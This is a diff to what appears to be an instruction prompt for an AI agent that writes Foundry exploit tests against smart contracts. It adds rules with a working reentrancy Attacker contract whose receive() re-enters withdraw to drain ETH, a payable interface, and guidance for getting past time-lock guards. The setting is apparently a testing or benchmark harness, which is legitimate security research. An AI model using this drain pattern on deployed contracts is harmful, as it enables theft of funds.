@@ -278,6 +278,82 @@ RULE D — DO NOT RE-INITIALIZE ALREADY-INITIALIZED CONTRACTS:
   the contract has an initialization guard. This is NOT a vulnerability.
   Stop retrying this exploit — the guard is real and working.
 
+RULE E — REENTRANCY ATTACK CONTRACT MUST BE PAYABLE:
+  For reentrancy exploits, your attack contract MUST be able to receive ETH callbacks.
+  Without a payable receive/fallback, the target's ETH transfer REVERTS silently and
+  your test fails with no useful error message.
+
+  MANDATORY — add these to every reentrancy attack contract:
+
+    contract Attacker {
+        address target;
+
+        constructor(address _target) {
+            target = _target;
+        }
+
+        // MANDATORY: without this, reentrancy callback reverts
+        receive() external payable {
+            // re-enter here if reentrancy count not exhausted
+            if (target.balance >= 1 ether) {
+                ITarget(target).withdrawFunction(1 ether);
+            }
+        }
+
+        fallback() external payable {}
+
+        function attack() external payable {
+            ITarget(target).depositFunction{value: 1 ether}();
+            ITarget(target).withdrawFunction(1 ether);
+        }
+    }
+
+  Replace depositFunction/withdrawFunction with the REAL function names from the
+  target contract. Do NOT use Deposit/Collect unless those are the actual names.
+
+  The reentrancy happens INSIDE receive(), not inside attack().
+  attack() just starts the chain. The loop runs through receive().
+
+RULE F — INLINE INTERFACE WITH PAYABLE (do not use BridgeInterfaces.sol for ETH calls):
+  When you need to call a function with {value: X}, define the interface INLINE:
+
+    interface ITarget {
+        function depositFunction() external payable;
+        function withdrawFunction(uint256 _am) external payable;
+    }
+
+  Replace depositFunction/withdrawFunction with the ACTUAL function names from the
+  contract signatures. Do NOT assume Deposit/Collect — read the real signatures.
+
+  Then interact:
+    ITarget(target).depositFunction{value: 1 ether}();
+    ITarget(target).withdrawFunction{value: 0}(1 ether);
+
+  Do NOT use the imported BridgeInterfaces.sol for payable calls — it may be missing
+  the payable keyword and will cause Error 7006.
+
+RULE G — TIME-LOCK AWARENESS (contracts with unlockTime / lockTime guards):
+  Some contracts have a time-lock: the deposit sets `unlockTime = now + lockDuration`,
+  and the collect/withdraw function silently returns (no revert) if `now <= unlockTime`.
+  This is NOT a bug in your code — it is a time-dependent guard.
+
+  The scaffold already calls `vm.warp(block.timestamp + 3601)` BEFORE `attacker.execute()`.
+  This advances the EVM clock past any reasonable lock period.
+
+  Your AttackContract MUST therefore:
+    1. Call the DEPOSIT function in execute() — this registers the account
+       (lock period was already advanced by the scaffold's vm.warp before execute() runs)
+    2. Call the WITHDRAW/COLLECT function — time is now past the lock, so it will proceed
+    3. Re-enter inside receive() to drain additional ETH
+
+  DO NOT call vm.warp inside AttackContract — the scaffold handles this.
+  DO NOT check msg.value in execute() — use address(this).balance instead.
+
+  Signature of a time-locked contract (look for these patterns in the source):
+    - `acc[msg.sender].unlockTime = now + _lockTime;`
+    - `require(now > acc[msg.sender].unlockTime);`
+    - A `Put(uint _lockTime)` deposit function that sets a future unlock time
+
 GOAL:
 - Write a test that passes ONLY if the exploit succeeds.
 - Deploy the target contract via deployCode() in setUp().
